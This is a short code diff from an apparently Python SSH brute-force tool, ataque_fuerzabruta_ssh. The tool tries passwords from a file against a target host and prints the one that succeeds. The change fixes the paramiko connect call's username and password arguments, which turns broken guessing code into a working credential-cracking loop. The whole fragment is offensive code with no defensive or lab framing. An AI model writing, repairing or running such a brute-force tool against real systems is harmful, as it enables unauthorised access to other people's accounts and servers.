@@ -14,7 +14,7 @@ def ataque_fuerzabruta_ssh(IP, usuario, archivo_contraseñas):
                     continue
                 try:
                     print(f"Probando contraseña: {contraseña}")
-                    cliente.connect(IP, usuario=usuario, contraseña=contraseña, timeout=3)
+                    cliente.connect(IP, username=usuario, password=contraseña, timeout=3)
                     print(f"\n Contraseña Encontrada: {contraseña}")
                     return contraseña
                 except paramiko.AuthenticationException:
